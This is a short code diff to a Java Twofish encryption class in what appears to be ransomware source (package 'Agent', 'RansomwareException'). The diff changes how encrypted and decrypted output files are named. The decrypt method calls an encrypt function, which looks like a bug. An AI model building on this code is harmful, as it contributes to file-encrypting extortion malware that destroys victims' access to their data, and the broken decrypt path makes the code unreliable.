@@ -10,11 +10,12 @@ import Agent.exceptions.RansomwareException;
 
 public class Twofish implements CryptoAlgorithm {
 
+
 	@Override
-	public void encrypt(SecretKey skey, File fileToEncrypt)  throws RansomwareException {
+	public void encrypt(SecretKey skey, File fileToEncrypt) throws RansomwareException {
 
 		try {
-			JavaCryptoUtil.encrypt(skey, fileToEncrypt, "twofish");
+			JavaCryptoUtil.encrypt(skey, fileToEncrypt, CHANGENAME.encryptedOutputFile(fileToEncrypt), "twofish");
 		} catch (CryptoException e) {
 			throw new CryptoException("problem with encrypting", e.getCause());
 		}
@@ -22,10 +23,10 @@ public class Twofish implements CryptoAlgorithm {
 	}
 
 	@Override
-	public void decrypt(SecretKey skey, File fileToDecrypt)  throws RansomwareException {
+	public void decrypt(SecretKey skey, File fileToDecrypt) throws RansomwareException {
 
 		try {
-			JavaCryptoUtil.encrypt(skey, fileToDecrypt, "twofish");
+			JavaCryptoUtil.encrypt(skey, fileToDecrypt, CHANGENAME.decryptedOutputFile(fileToDecrypt),"twofish");
 		} catch (CryptoException e) {
 			throw new CryptoException("problem with decrypting", e.getCause());
 		}
